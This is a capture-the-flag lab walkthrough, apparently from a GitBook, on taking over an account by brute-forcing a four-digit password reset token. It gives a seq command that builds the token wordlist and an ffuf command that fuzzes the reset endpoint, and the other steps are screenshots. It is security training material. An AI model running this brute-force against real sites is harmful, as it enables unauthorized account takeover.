# Brute-Forcing Password Reset Tokens

### Takeover another user's account on the target system to obtain the flag.

In order to exploit the password reset functionallity we must first find the reset endpoint

**Step 1** - Access the Web Application and Reset the Password:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 2** - Insert a username and click **Submit**:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Click on **here**:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 4** - Get the password reset token endpoint:&#x20;

* You'll get this warning. Click again on submit:

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* And we got the endpoint:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 4** - Brute-force the reset token:

* Create a numeric wordlist with all possible combinations:
  * ```bash
    seq -w 0 9999 > tokens.txt
    ```
*   Use the wordlist to brute-force the token with **ffuf**:

    * {% code overflow="wrap" %}
      ```bash
      ffuf -w ./tokens.txt -u http://SERVER_IP:SERVER_PORT/reset_password.php?token=FUZZ -fr "The provided token is invalid"
      ```
      {% endcode %}

    <figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 5** - Reset the password:

* Insert the token at the end of the URL:

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Change the password:

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 6** - Retrieve the flag:

* After reseting the password, login into the application with the credentials and retrieve the flag:

<figure><img src="../../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>
